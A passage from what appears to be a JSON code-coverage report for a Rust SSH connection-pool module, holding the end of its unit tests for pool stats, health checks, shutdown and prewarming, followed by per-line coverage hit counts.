RusshConnectionPool::new(ConnectionConfig::default());\n        pool.release(\"nonexistent.com\", 22, \"user\").await;\n        let stats = pool.stats().await;\n        assert_eq!(stats.total_connections, 0);\n    }\n\n    #[tokio::test]\n    async fn test_pool_connections_for_host() {\n        let pool = RusshConnectionPool::new(ConnectionConfig::default());\n        let count = pool.connections_for_host(\"example.com\", 22, \"user\").await;\n        assert_eq!(count, 0);\n    }\n\n    #[tokio::test]\n    async fn test_pool_health_check_empty() {\n        let pool = RusshConnectionPool::new(ConnectionConfig::default());\n        pool.health_check().await;\n        let stats = pool.stats().await;\n        assert_eq!(stats.health_check_failures, 0);\n    }\n\n    #[tokio::test]\n    async fn test_pool_cleanup_idle_empty() {\n        let pool = RusshConnectionPool::new(ConnectionConfig::default());\n        pool.cleanup_idle().await;\n        let stats = pool.stats().await;\n        assert_eq!(stats.idle_timeouts, 0);\n    }\n\n    #[tokio::test]\n    async fn test_pool_get_after_shutdown() {\n        let pool = RusshConnectionPool::new(ConnectionConfig::default());\n        pool.close_all().await.unwrap();\n        let result = pool.get(\"example.com\", 22, \"user\").await;\n        assert!(result.is_err());\n    }\n\n    #[tokio::test]\n    async fn test_pool_health_ping_empty() {\n        let pool = RusshConnectionPool::new(ConnectionConfig::default());\n        let result = pool.health_ping(\"example.com\", 22, \"user\").await;\n        assert!(!result);\n    }\n\n    #[tokio::test]\n    async fn test_prewarm_after_shutdown() {\n        let pool = Arc::new(RusshConnectionPool::new(ConnectionConfig::default()));\n        pool.close_all().await.unwrap();\n        let result = pool.prewarm(\"example.com\", 22, \"user\", 3, None).await;\n        assert_eq!(result.success, 0);\n        assert_eq!(result.failures, 3);\n    }\n}\n","traces":[{"line":30,"address":[33231680],"length":1,"stats":{"Line":0}},{"line":31,"address":[33231684,33231117,33230233,33231417,33231562,33228712],"length":1,"stats":{"Line":0}},{"line":32,"address":[33231582,33231137,33230271,33228744,33231437,33231704],"length":1,"stats":{"Line":0}},{"line":74,"address":[33228368],"length":1,"stats":{"Line":1}},{"line":79,"address":[33228390],"length":1,"stats":{"Line":1}},{"line":80,"address":[33228406],"length":1,"stats":{"Line":1}},{"line":82,"address":[33228421],"length":1,"stats":{"Line":1}},{"line":84,"address":[33228438],"length":1,"stats":{"Line":1}},{"line":85,"address":[33228457],"length":1,"stats":{"Line":1}},{"line":87,"address":[33228476],"length":1,"stats":{"Line":1}},{"line":94,"address":[33230080],"length":1,"stats":{"Line":1}},{"line":95,"address":[33230088],"length":1,"stats":{"Line":1}},{"line":99,"address":[33229936],"length":1,"stats":{"Line":1}},{"line":100,"address":[33229953],"length":1,"stats":{"Line":1}},{"line":101,"address":[33229957],"length":1,"stats":{"Line":1}},{"line":105,"address":[33229792],"length":1,"stats":{"Line":1}},{"line":106,"address":[33229809],"length":1,"stats":{"Line":1}},{"line":107,"address":[33229813],"length":1,"stats":{"Line":1}},{"line":111,"address":[33229488],"length":1,"stats":{"Line":1}},{"line":112,"address":[33229508],"length":1,"stats":{"Line":1}},{"line":113,"address":[33229514],"length":1,"stats":{"Line":1}},{"line":117,"address":[33229744],"length":1,"stats":{"Line":0}},{"line":118,"address":[33229764],"length":1,"stats":{"Line":0}},{"line":119,"address":[33229771],"length":1,"stats":{"Line":0}},{"line":123,"address":[33229632],"length":1,"stats":{"Line":1}},{"line":124,"address":[33229655],"length":1,"stats":{"Line":1}},{"line":125,"address":[33229663],"length":1,"stats":{"Line":1}},{"line":129,"address":[33229696],"length":1,"stats":{"Line":0}},{"line":130,"address":[33229716],"length":1,"stats":{"Line":0}},{"line":131,"address":[33229723],"length":1,"stats":{"Line":0}},{"line":135,"address":[33229840],"length":1,"stats":{"Line":0}},{"line":136,"address":[33229856],"length":1,"stats":{"Line":0}},{"line":137,"address":[33229859],"length":1,"stats":{"Line":0}},{"line":141,"address":[33229536],"length":1,"stats":{"Line":0}},{"line":142,"address":[33229556],"length":1,"stats":{"Line":0}},{"line":143,"address":[33229563],"length":1,"stats":{"Line":0}},{"line":147,"address":[33229984],"length":1,"stats":{"Line":1}},{"line":148,"address":[33230001],"length":1,"stats":{"Line":1}},{"line":149,"address":[33230005],"length":1,"stats":{"Line":1}},{"line":153,"address":[33230032],"length":1,"stats":{"Line":0}},{"line":154,"address":[33230052],"length":1,"stats":{"Line":0}},{"line":155,"address":[33230059],"length":1,"stats":{"Line":0}},{"line":159,"address":[33229888],"length":1,"stats":{"Line":0}},{"line":160,"address":[33229904],"length":1,"stats":{"Line":0}},{"line":161,"address":[33229907],"length":1,"stats":{"Line":0}},{"line":165,"address":[33229584],"length":1,"stats":{"Line":0}},{"line":166,"address":[33229604],"length":1,"stats":{"Line":0}},{"line":167,"address":[33229611],"length":1,"stats":{"Line":0}},{"line":195,"address":[33231216],"length":1,"stats":{"Line":0}},{"line":202,"address":[33231236],"length":1,"stats":{"Line":0}},{"line":206,"address":[33230968,33230144,33231016],"length":1,"stats":{"Line":0}},{"line":214,"address":[33230394,33230217],"length":1,"stats":{"Line":0}},{"line":216,"address":[33230402],"length":1,"stats":{"Line":0}},{"line":218,"address":[33230472,33230529],"length":1,"stats":{"Line":0}},{"line":219,"address":[33230557],"length":1,"stats":{"Line":0}},{"line":220,"address":[33230600],"length":1,"stats":{"Line":0}},{"line":230,"address":[33231664,33231672],"length":1,"stats":{"Line":0}},{"line":231,"address":[25978820],"length":1,"stats":{"Line":0}},{"line":235,"address":[33231073,33231056],"length":1,"stats":{"Line":0}},{"line":236,"address":[23436431,23436565,23436725,23436500],"length":1,"stats":{"Line":0}},{"line":237,"address":[23436940],"length":1,"stats":{"Line":0}},{"line":239,"address":[23436915,23437248,23437016],"length":1,"stats":{"Line":0}},{"line":245,"address":[23437235],"length":1,"stats":{"Line":0}},{"line":252,"address":[33231264],"length":1,"stats":{"Line":0}},{"line":253,"address":[33231277,33231325,33231334],"length":1,"stats":{"Line":0}},{"line":254,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[33231284],"length":1,"stats":{"Line":0}},{"line":258,"address":[33231340],"length":1,"stats":{"Line":0}},{"line":259,"address":[33231359],"length":1,"stats":{"Line":0}},{"line":261,"address":[33231329],"length":1,"stats":{"Line":0}},{"line":267,"address":[33231536],"length":1,"stats":{"Line":0}},{"line":268,"address":[33231550],"length":1,"stats":{"Line":0}},{"line":269,"address":[33231618],"length":1,"stats":{"Line":0}},{"line":270,"address":[33231630],"length":1,"stats":{"Line":0}},{"line":275,"address":[33231376],"length":1,"stats":{"Line":0}},{"line":276,"address":[33231394],"length":1,"stats":{"Line":0}},{"line":277,"address":[33231472],"length":1,"stats":{"Line":0}},{"line":278,"address":[33231477],"length":1,"stats":{"Line":0}},{"line":279,"address":[33231500],"length":1,"stats":{"Line":0}},{"line":284,"address":[33230112],"length":1,"stats":{"Line":0}},{"line":285,"address":[33230117,33236122,33235914],"length":1,"stats":{"Line":0}},{"line":289,"address":[33231104],"length":1,"stats":{"Line":0}},{"line":290,"address":[33231172],"length":1,"stats":{"Line":0}},{"line":291,"address":[33231177],"length":1,"stats":{"Line":0}},{"line":292,"address":[33231197],"length":1,"stats":{"Line":0}},{"line":297,"address":[33228640,33229463,33229469],"length":1,"stats":{"Line":0}},{"line":299,"address":[33228678],"length":1,"stats":{"Line":0}},{"line":300,"address":[33228700],"length":1,"stats":{"Line":0}},{"line":301,"address":[33228862],"length":1,"stats":{"Line":0}},{"line":302,"address":[33228905],"length":1,"stats":{"Line":0}},{"line":303,"address":[33228980],"length":1,"stats":{"Line":0}},{"line":304,"address":[33229054],"length":1,"stats":{"Line":0}},{"line":305,"address":[33229085],"length":1,"stats":{"Line":0}},{"line":306,"address":[33229097],"length":1,"stats":{"Line":0}},{"line":307,"address":[33229180],"length":1,"stats":{"Line":0}},{"line":308,"address":[33229248],"length":1,"stats":{"Line":0}},{"line":356,"address":[33235360,33235515,33235540],"length":1,"stats":{"Line":1}},{"line":357,"address":[33235377,33235533],"length":1,"stats":{"Line":1}},{"line":361,"address":[33233060,33231840],"length":1,"stats":{"Line":1}},{"line":362,"address":[33232254,33231876,33231968],"length":1,"stats":{"Line":2}},{"line":371,"address":[33232688,33232199],"length":1,"stats":{"Line":2}},{"line":372,"address":[33232751,33232704],"length":1,"stats":{"Line":2}},{"line":373,"address":[33232869,33232822],"length":1,"stats":{"Line":2}},{"line":374,"address":[33232901],"length":1,"stats":{"Line":1}},{"line":378,"address":[33233296],"length":1,"stats":{"Line":1}},{"line":379,"address":[33233340],"length":1,"stats":{"Line":1}},{"line":382,"address":[33235264],"length":1,"stats":{"Line":1}},{"line":388,"address":[25974183],"length":1,"stats":{"Line":3}},{"line":391,"address":[33233616],"length":1,"stats":{"Line":1}},{"line":398,"address":[23444968,23444816],"length":1,"stats":{"Line":2}},{"line":399,"address":[23445034],"length":1,"stats":{"Line":1}},{"line":402,"address":[23444982],"length":1,"stats":{"Line":0}},{"line":404,"address":[26020632],"length":1,"stats":{"Line":0}},{"line":405,"address":[23445987,23445740],"length":1,"stats":{"Line":0}},{"line":408,"address":[23446864,23446476,23446306,23446088,23445763,23446400],"length":1,"stats":{"Line":0}},{"line":409,"address":[23445775],"length":1,"stats":{"Line":0}},{"line":410,"address":[26020650],"length":1,"stats":{"Line":0}},{"line":411,"address":[23446645,23446702],"length":1,"stats":{"Line":0}},{"line":414,"address":[33233136],"length":1,"stats":{"Line":0}},{"line":421,"address":[23442792,23442640],"length":1,"stats":{"Line":0}},{"line":422,"address":[23442858],"length":1,"stats":{"Line":0}},{"line":425,"address":[23442806],"length":1,"stats":{"Line":0}},{"line":427,"address":[23442965,23442703,23443075,23443224],"length":1,"stats":{"Line":0}},{"line":428,"address":[23443579],"length":1,"stats":{"Line":0}},{"line":431,"address":[23443672,23444065,23444295],"length":1,"stats":{"Line":0}},{"line":432,"address":[23444098,23444050,23442724,23444131,23444423],"length":1,"stats":{"Line":0}},{"line":435,"address":[33233794,33233776],"length":1,"stats":{"Line":0}},{"line":436,"address":[26024815],"length":1,"stats":{"Line":0}},{"line":438,"address":[23447660,23447739],"length":1,"stats":{"Line":0}},{"line":439,"address":[23448864,23447825,23447928,23447912],"length":1,"stats":{"Line":0}},{"line":440,"address":[23448927,23449008],"length":1,"stats":{"Line":0}},{"line":441,"address":[26024830],"length":1,"stats":{"Line":0}},{"line":443,"address":[26024845],"length":1,"stats":{"Line":0}},{"line":444,"address":[23449598,23449543,23449486],"length":1,"stats":{"Line":0}},{"line":445,"address":[23449623,23449586,23449673],"length":1,"stats":{"Line":0}},{"line":447,"address":[23449691,23449970],"length":1,"stats":{"Line":0}},{"line":448,"address":[23450242,23449951],"length":1,"stats":{"Line":0}},{"line":450,"address":[23448272,23448208],"length":1,"stats":{"Line":0}},{"line":451,"address":[23448279],"length":1,"stats":{"Line":0}},{"line":456,"address":[23447866],"length":1,"stats":{"Line":0}},{"line":459,"address":[33234880],"length":1,"stats":{"Line":0}},{"line":467,"address":[23464703],"length":1,"stats":{"Line":0}},{"line":470,"address":[23464983,23465197,23465070,23464788],"length":1,"stats":{"Line":0}},{"line":471,"address":[23465473,23465558,23465636],"length":1,"stats":{"Line":0}},{"line":472,"address":[23465747,23465691],"length":1,"stats":{"Line":0}},{"line":473,"address":[23465768],"length":1,"stats":{"Line":0}},{"line":474,"address":[23464809,23465804,23466252],"length":1,"stats":{"Line":0}},{"line":480,"address":[23464830,23466638,23466121,23466034],"length":1,"stats":{"Line":0}},{"line":481,"address":[23466914,23467000],"length":1,"stats":{"Line":0}},{"line":482,"address":[23467046],"length":1,"stats":{"Line":0}},{"line":483,"address":[23464851,23468519,23468341],"length":1,"stats":{"Line":0}},{"line":487,"address":[23467525,23467092],"length":1,"stats":{"Line":0}},{"line":490,"address":[23467425],"length":1,"stats":{"Line":0}},{"line":491,"address":[23467455],"length":1,"stats":{"Line":0}},{"line":492,"address":[23467470],"length":1,"stats":{"Line":0}},{"line":493,"address":[23467999,23467500],"length":1,"stats":{"Line":0}},{"line":494,"address":[23468007],"length":1,"stats":{"Line":0}},{"line":496,"address":[26042975],"length":1,"stats":{"Line":0}},{"line":498,"address":[23469645,23469732,23469848],"length":1,"stats":{"Line":0}},{"line":499,"address":[23469342],"length":1,"stats":{"Line":0}},{"line":500,"address":[23469375,23469465],"length":1,"stats":{"Line":0}},{"line":501,"address":[23469473],"length":1,"stats":{"Line":0}},{"line":502,"address":[23469488],"length":1,"stats":{"Line":0}},{"line":503,"address":[23469570],"length":1,"stats":{"Line":0}},{"line":504,"address":[23469638],"length":1,"stats":{"Line":0}},{"line":507,"address":[23469936,23469858],"length":1,"stats":{"Line":0}},{"line":510,"address":[23469951,23470321,23464893],"length":1,"stats":{"Line":0}},{"line":511,"address":[23470568],"length":1,"stats":{"Line":0}},{"line":512,"address":[23470631],"length":1,"stats":{"Line":0}},{"line":513,"address":[23470696],"length":1,"stats":{"Line":0}},{"line":514,"address":[23470719],"length":1,"stats":{"Line":0}},{"line":518,"address":[26043017],"length":1,"stats":{"Line":0}},{"line":519,"address":[23471220,23471157,23471287],"length":1,"stats":{"Line":0}},{"line":520,"address":[23471315,23471380,23471272],"length":1,"stats":{"Line":0}},{"line":521,"address":[23471406,23471365,23471463],"length":1,"stats":{"Line":0}},{"line":522,"address":[23471564,23471642,23471452],"length":1,"stats":{"Line":0}},{"line":523,"address":[23471512,23471644,23471607],"length":1,"stats":{"Line":0}},{"line":525,"address":[23471492,23471566,23471529],"length":1,"stats":{"Line":0}},{"line":529,"address":[23471964,23471665],"length":1,"stats":{"Line":0}},{"line":530,"address":[23471925,23472305],"length":1,"stats":{"Line":0}},{"line":533,"address":[33234736,33234754],"length":1,"stats":{"Line":0}},{"line":534,"address":[23462046,23462203],"length":1,"stats":{"Line":0}},{"line":535,"address":[23462209],"length":1,"stats":{"Line":0}},{"line":536,"address":[23462263],"length":1,"stats":{"Line":0}},{"line":538,"address":[23462609,23462318],"length":1,"stats":{"Line":0}},{"line":539,"address":[26038065],"length":1,"stats":{"Line":0}},{"line":540,"address":[23463202],"length":1,"stats":{"Line":0}},{"line":542,"address":[23462127,23462425,23463238,23462400],"length":1,"stats":{"Line":0}},{"line":545,"address":[23462661],"length":1,"stats":{"Line":0}},{"line":548,"address":[33235788,33235728],"length":1,"stats":{"Line":5}},{"line":549,"address":[23494460,23494498],"length":1,"stats":{"Line":2}},{"line":550,"address":[23494998,23494620,23494696],"length":1,"stats":{"Line":2}},{"line":552,"address":[23494969,23495408,23495287,23494539],"length":1,"stats":{"Line":2}},{"line":554,"address":[23495650,23495729],"length":1,"stats":{"Line":2}},{"line":555,"address":[23495811,23495901,23495885],"length":1,"stats":{"Line":0}},{"line":556,"address":[23495995],"length":1,"stats":{"Line":0}},{"line":557,"address":[23496068],"length":1,"stats":{"Line":0}},{"line":559,"address":[25982542],"length":1,"stats":{"Line":0}},{"line":560,"address":[23497070,23497127],"length":1,"stats":{"Line":0}},{"line":561,"address":[23497190,23497257],"length":1,"stats":{"Line":0}},{"line":563,"address":[23497551,23497277],"length":1,"stats":{"Line":0}},{"line":569,"address":[23496509,23496222,23495834],"length":1,"stats":{"Line":2}},{"line":572,"address":[23441271,23441193,23441156,23441401,23441072,23441097,23441904],"length":1,"stats":{"Line":4}},{"line":573,"address":[23441141],"length":1,"stats":{"Line":1}},{"line":578,"address":[23441432,23441183,23441323,23441215],"length":1,"stats":{"Line":2}},{"line":579,"address":[23441652,23441717],"length":1,"stats":{"Line":2}},{"line":582,"address":[23441876,23441782,23442185],"length":1,"stats":{"Line":3}},{"line":583,"address":[26005137],"length":1,"stats":{"Line":0}},{"line":587,"address":[33233888,33233906],"length":1,"stats":{"Line":0}},{"line":589,"address":[26029535],"length":1,"stats":{"Line":0}},{"line":590,"address":[23455529,23455600],"length":1,"stats":{"Line":0}},{"line":593,"address":[23455703],"length":1,"stats":{"Line":0}},{"line":595,"address":[23455767,23455878,23456329,23456457],"length":1,"stats":{"Line":0}},{"line":596,"address":[26029550],"length":1,"stats":{"Line":0}},{"line":597,"address":[23456277,23456315],"length":1,"stats":{"Line":0}},{"line":601,"address":[23456559,23456624],"length":1,"stats":{"Line":0}},{"line":602,"address":[23455057,23456981,23456598,23456642],"length":1,"stats":{"Line":0}},{"line":603,"address":[23457199,23457386,23457278],"length":1,"stats":{"Line":0}},{"line":604,"address":[23457371,23457415],"length":1,"stats":{"Line":0}},{"line":606,"address":[23457423,23458832,23458912,23458926,23458850],"length":1,"stats":{"Line":0}},{"line":607,"address":[23457521,23457442],"length":1,"stats":{"Line":0}},{"line":609,"address":[23457512,23457541],"length":1,"stats":{"Line":0}},{"line":610,"address":[23457594,23457543,23457854],"length":1,"stats":{"Line":0}},{"line":611,"address":[26029586],"length":1,"stats":{"Line":0}},{"line":612,"address":[23458485,23458564,23458618],"length":1,"stats":{"Line":0}},{"line":613,"address":[23458652,23458606],"length":1,"stats":{"Line":0}},{"line":619,"address":[23440072,23439922,23439885,23440560,23439776,23439801,23439942],"length":1,"stats":{"Line":4}},{"line":620,"address":[23439845],"length":1,"stats":{"Line":1}},{"line":622,"address":[23439862,23439912,23440103,23439994],"length":1,"stats":{"Line":2}},{"line":623,"address":[23440323,23440388],"length":1,"stats":{"Line":2}},{"line":626,"address":[23440535,23440453,23440838],"length":1,"stats":{"Line":3}},{"line":627,"address":[26004769],"length":1,"stats":{"Line":0}},{"line":631,"address":[23450652,23450609,23450709,23452240,23450448,23450673,23450860,23450479],"length":1,"stats":{"Line":0}},{"line":633,"address":[23450639,23450894,23450580,23450767],"length":1,"stats":{"Line":0}},{"line":634,"address":[23451224,23451153],"length":1,"stats":{"Line":0}},{"line":637,"address":[23451331],"length":1,"stats":{"Line":0}},{"line":639,"address":[23451639,23451504,23452170,23451398],"length":1,"stats":{"Line":0}},{"line":640,"address":[23452001,23451710,23452091],"length":1,"stats":{"Line":0}},{"line":641,"address":[23452133],"length":1,"stats":{"Line":0}},{"line":645,"address":[23451751,23451816],"length":1,"stats":{"Line":0}},{"line":646,"address":[23451834,23451790,23452254,23450660],"length":1,"stats":{"Line":0}},{"line":647,"address":[23452481,23452560,23452694],"length":1,"stats":{"Line":0}},{"line":648,"address":[23452715,23452662],"length":1,"stats":{"Line":0}},{"line":649,"address":[23452723],"length":1,"stats":{"Line":0}},{"line":650,"address":[23452793],"length":1,"stats":{"Line":0}},{"line":652,"address":[23452896],"length":1,"stats":{"Line":0}},{"line":653,"address":[23452916,23452977],"length":1,"stats":{"Line":0}},{"line":654,"address":[23452985],"length":1,"stats":{"Line":0}},{"line":656,"address":[23453006,23454608],"length":1,"stats":{"Line":0}},{"line":657,"address":[23454632],"length":1,"stats":{"Line":0}},{"line":658,"address":[23454716],"length":1,"stats":{"Line":0}},{"line":661,"address":[23454816,23454652,23454830],"length":1,"stats":{"Line":0}},{"line":662,"address":[23454710,23454781],"length":1,"stats":{"Line":0}},{"line":663,"address":[23454783,23454742],"length":1,"stats":{"Line":0}},{"line":665,"address":[23454727],"length":1,"stats":{"Line":0}},{"line":668,"address":[23453067,23453152],"length":1,"stats":{"Line":0}},{"line":669,"address":[23453172,23453140],"length":1,"stats":{"Line":0}},{"line":670,"address":[23453177,23453508],"length":1,"stats":{"Line":0}},{"line":671,"address":[23453479,23453929,23450681,23453854],"length":1,"stats":{"Line":0}},{"line":672,"address":[23454161,23454243,23454297],"length":1,"stats":{"Line":0}},{"line":673,"address":[23454361],"length":1,"stats":{"Line":0}},{"line":674,"address":[23454285,23454331],"length":1,"stats":{"Line":0}},{"line":675,"address":[23454450],"length":1,"stats":{"Line":0}},{"line":676,"address":[23454394],"length":1,"stats":{"Line":0}},{"line":683,"address":[23485390,23484857,23484752,23484787,23484896,23485000],"length":1,"stats":{"Line":4}},{"line":684,"address":[23485310,23484948,23484835,23484884,23485031],"length":1,"stats":{"Line":3}},{"line":687,"address":[33234784,33234844],"length":1,"stats":{"Line":5}},{"line":688,"address":[23463490,23463449],"length":1,"stats":{"Line":2}},{"line":689,"address":[23463773,23463528,23463590,23463664],"length":1,"stats":{"Line":2}},{"line":690,"address":[23464336,23464345,23464066,23464124,23464004],"length":1,"stats":{"Line":3}},{"line":693,"address":[33235856,33235864],"length":1,"stats":{"Line":4}},{"line":694,"address":[23499113,23498640,23498810],"length":1,"stats":{"Line":2}},{"line":695,"address":[23499083],"length":1,"stats":{"Line":1}},{"line":698,"address":[23499320,23499400,23498701,23499521],"length":1,"stats":{"Line":2}},{"line":699,"address":[23499753,23499824],"length":1,"stats":{"Line":2}},{"line":702,"address":[23499889],"length":1,"stats":{"Line":1}},{"line":704,"address":[23500132,23500064,23501665,23499953],"length":1,"stats":{"Line":4}},{"line":705,"address":[23501379,23501765,23501921],"length":1,"stats":{"Line":0}},{"line":706,"address":[23501486,23501993,23502288],"length":1,"stats":{"Line":0}},{"line":707,"address":[25989393],"length":1,"stats":{"Line":0}},{"line":708,"address":[23500507,23500940,23500605],"length":1,"stats":{"Line":0}},{"line":709,"address":[23500878],"length":1,"stats":{"Line":0}},{"line":715,"address":[25989412],"length":1,"stats":{"Line":1}},{"line":716,"address":[23502993,23502938],"length":1,"stats":{"Line":2}},{"line":719,"address":[23503104,23504058],"length":1,"stats":{"Line":2}},{"line":720,"address":[23503823,23503154,23504063],"length":1,"stats":{"Line":2}},{"line":721,"address":[23504046],"length":1,"stats":{"Line":1}},{"line":723,"address":[23503129,23503450,23503186],"length":1,"stats":{"Line":0}},{"line":724,"address":[23503733,23503417],"length":1,"stats":{"Line":0}},{"line":728,"address":[23498124,23498511,23498085,23498019,23498230,23497984],"length":1,"stats":{"Line":0}},{"line":729,"address":[23498179,23498112,23498261,23498078],"length":1,"stats":{"Line":0}},{"line":733,"address":[33235568],"length":1,"stats":{"Line":1}},{"line":741,"address":[23485860,23485695],"length":1,"stats":{"Line":2}},{"line":742,"address":[23485974],"length":1,"stats":{"Line":1}},{"line":744,"address":[23485967],"length":1,"stats":{"Line":1}},{"line":748,"address":[23485907],"length":1,"stats":{"Line":0}},{"line":749,"address":[23485750,23486007,23486096,23486298],"length":1,"stats":{"Line":0}},{"line":750,"address":[23486595,23486522],"length":1,"stats":{"Line":0}},{"line":753,"address":[23486564],"length":1,"stats":{"Line":0}},{"line":754,"address":[23486603],"length":1,"stats":{"Line":0}},{"line":756,"address":[23486670],"length":1,"stats":{"Line":0}},{"line":757,"address":[23487064,23486746,23486680],"length":1,"stats":{"Line":0}},{"line":758,"address":[23487019],"length":1,"stats":{"Line":0}},{"line":764,"address":[23486708,23487931,23487634],"length":1,"stats":{"Line":0}},{"line":766,"address":[23487907,23488334],"length":1,"stats":{"Line":0}},{"line":768,"address":[23489325,23488341,23488440],"length":1,"stats":{"Line":0}},{"line":769,"address":[23488791,23488507],"length":1,"stats":{"Line":0}},{"line":770,"address":[23488807,23488894],"length":1,"stats":{"Line":0}},{"line":771,"address":[23488902,23488989],"length":1,"stats":{"Line":0}},{"line":772,"address":[23488997],"length":1,"stats":{"Line":0}},{"line":774,"address":[23493219,23493140,23493950,23493072,23493576,23489065,23494069],"length":1,"stats":{"Line":0}},{"line":775,"address":[23493607,23493249,23493311,23493186],"length":1,"stats":{"Line":0}},{"line":779,"address":[23488540],"length":1,"stats":{"Line":0}},{"line":780,"address":[23488551],"length":1,"stats":{"Line":0}},{"line":782,"address":[23488562,23491598,23491520],"length":1,"stats":{"Line":0}},{"line":783,"address":[25981982],"length":1,"stats":{"Line":0}},{"line":784,"address":[23489851],"length":1,"stats":{"Line":0}},{"line":785,"address":[23489780],"length":1,"stats":{"Line":0}},{"line":786,"address":[23489812,23490031,23490340],"length":1,"stats":{"Line":0}},{"line":787,"address":[23490702,23490727,23490304],"length":1,"stats":{"Line":0}},{"line":789,"address":[23489689],"length":1,"stats":{"Line":0}},{"line":790,"address":[23491108,23489721,23490799],"length":1,"stats":{"Line":0}},{"line":791,"address":[23491470,23491072,23491499],"length":1,"stats":{"Line":0}},{"line":797,"address":[23491873,23491702,23485792],"length":1,"stats":{"Line":0}},{"line":798,"address":[23492242,23492193,23492111],"length":1,"stats":{"Line":0}},{"line":801,"address":[23492581,23492263],"length":1,"stats":{"Line":0}},{"line":806,"address":[33235072],"length":1,"stats":{"Line":0}},{"line":813,"address":[23472901],"length":1,"stats":{"Line":0}},{"line":814,"address":[23473160],"length":1,"stats":{"Line":0}},{"line":815,"address":[23473177],"length":1,"stats":{"Line":0}},{"line":817,"address":[23473204],"length":1,"stats":{"Line":0}},{"line":819,"address":[23473307,23473222,23474928],"length":1,"stats":{"Line":0}},{"line":820,"address":[23474997],"length":1,"stats":{"Line":0}},{"line":821,"address":[23475383,23472986,23475495,23473423],"length":1,"stats":{"Line":0}},{"line":822,"address":[23475680],"length":1,"stats":{"Line":0}},{"line":826,"address":[23476425,23476349,23473007,23473460,23475343],"length":1,"stats":{"Line":0}},{"line":827,"address":[23476761,23476690,23476831],"length":1,"stats":{"Line":0}},{"line":828,"address":[23476932,23476886],"length":1,"stats":{"Line":0}},{"line":829,"address":[23476945],"length":1,"stats":{"Line":0}},{"line":835,"address":[26054585],"length":1,"stats":{"Line":0}},{"line":836,"address":[23477439,23477368],"length":1,"stats":{"Line":0}},{"line":837,"address":[23477470],"length":1,"stats":{"Line":0}},{"line":841,"address":[23473752,23477857,23477774,23473825],"length":1,"stats":{"Line":0}},{"line":842,"address":[23477508],"length":1,"stats":{"Line":0}},{"line":843,"address":[23477538],"length":1,"stats":{"Line":0}},{"line":844,"address":[23477553],"length":1,"stats":{"Line":0}},{"line":845,"address":[23477648,23477583],"length":1,"stats":{"Line":0}},{"line":846,"address":[23477656],"length":1,"stats":{"Line":0}},{"line":848,"address":[26054606],"length":1,"stats":{"Line":0}},{"line":850,"address":[23473947],"length":1,"stats":{"Line":0}},{"line":851,"address":[23474305,23474396,23474499],"length":1,"stats":{"Line":0}},{"line":852,"address":[23474024],"length":1,"stats":{"Line":0}},{"line":853,"address":[23474140,23474050],"length":1,"stats":{"Line":0}},{"line":854,"address":[23474148],"length":1,"stats":{"Line":0}},{"line":855,"address":[23474163],"length":1,"stats":{"Line":0}},{"line":856,"address":[23474245],"length":1,"stats":{"Line":0}},{"line":861,"address":[26054627],"length":1,"stats":{"Line":0}},{"line":862,"address":[23478164],"length":1,"stats":{"Line":0}},{"line":863,"address":[23478227],"length":1,"stats":{"Line":0}},{"line":864,"address":[23478292],"length":1,"stats":{"Line":0}},{"line":865,"address":[23478323],"length":1,"stats":{"Line":0}},{"line":869,"address":[26054648],"length":1,"stats":{"Line":0}},{"line":870,"address":[23478841,23478788,23478731],"length":1,"stats":{"Line":0}},{"line":871,"address":[23478829,23478866,23478921],"length":1,"stats":{"Line":0}},{"line":872,"address":[23478909,23478994,23478944],"length":1,"stats":{"Line":0}},{"line":875,"address":[23479299,23479015],"length":1,"stats":{"Line":0}},{"line":876,"address":[23479275],"length":1,"stats":{"Line":0}},{"line":878,"address":[23473860],"length":1,"stats":{"Line":0}},{"line":879,"address":[23473890,23474759],"length":1,"stats":{"Line":0}},{"line":884,"address":[23475023,23479840],"length":1,"stats":{"Line":0}},{"line":885,"address":[23479854],"length":1,"stats":{"Line":0}},{"line":890,"address":[33231744,33231804],"length":1,"stats":{"Line":5}},{"line":891,"address":[23438315,23438277],"length":1,"stats":{"Line":2}},{"line":892,"address":[23438450],"length":1,"stats":{"Line":1}},{"line":894,"address":[26000223],"length":1,"stats":{"Line":2}},{"line":895,"address":[23438884,23438957],"length":1,"stats":{"Line":2}},{"line":896,"address":[23439120,23439398,23439033,23439098],"length":1,"stats":{"Line":0}},{"line":897,"address":[23439462,23439546],"length":1,"stats":{"Line":0}},{"line":898,"address":[26000238],"length":1,"stats":{"Line":0}},{"line":899,"address":[23439371],"length":1,"stats":{"Line":0}},{"line":905,"address":[23439058],"length":1,"stats":{"Line":1}},{"line":908,"address":[33235232,33235240],"length":1,"stats":{"Line":0}},{"line":909,"address":[23480247,23480082],"length":1,"stats":{"Line":0}},{"line":914,"address":[26059010],"length":1,"stats":{"Line":0}},{"line":915,"address":[23480755],"length":1,"stats":{"Line":0}},{"line":917,"address":[23480849,23483616],"length":1,"stats":{"Line":0}},{"line":918,"address":[23483651,23484055,23483696,23484061],"length":1,"stats":{"Line":0}},{"line":920,"address":[23483734],"length":1,"stats":{"Line":0}},{"line":921,"address":[23483768,23483831],"length":1,"stats":{"Line":0}},{"line":922,"address":[23483843],"length":1,"stats":{"Line":0}},{"line":923,"address":[23483888,23483949],"length":1,"stats":{"Line":0}},{"line":930,"address":[23481549,23480910,23480980],"length":1,"stats":{"Line":0}},{"line":931,"address":[26059028],"length":1,"stats":{"Line":0}},{"line":932,"address":[23482198],"length":1,"stats":{"Line":0}},{"line":933,"address":[23482382,23482266],"length":1,"stats":{"Line":0}},{"line":934,"address":[23482354,23482409,23482727],"length":1,"stats":{"Line":0}},{"line":935,"address":[26059046],"length":1,"stats":{"Line":0}},{"line":941,"address":[33234702,33234708,33233936],"length":1,"stats":{"Line":0}},{"line":942,"address":[33233951],"length":1,"stats":{"Line":0}},{"line":943,"address":[33234035,33233972],"length":1,"stats":{"Line":0}},{"line":944,"address":[33234077],"length":1,"stats":{"Line":0}},{"line":945,"address":[33234138],"length":1,"stats":{"Line":0}},{"line":946,"address":[33234194],"length":1,"stats":{"Line":0}},{"line":948,"address":[33234236],"length":1,"stats":{"Line":0}},{"line":949,"address":[33234293],"length":1,"stats":{"Line":0}},{"line":950,"address":[23460090,23460118,23460201,23460900,23460967,23460025,23460000],"length":1,"stats":{"Line":0}},{"line":951,"address":[23460062,23460171],"length":1,"stats":{"Line":0}},{"line":953,"address":[26030652],"length":1,"stats":{"Line":0}},{"line":954,"address":[23460711],"length":1,"stats":{"Line":0}},{"line":957,"address":[23460123,23460256,23460277,23460770,23460817],"length":1,"stats":{"L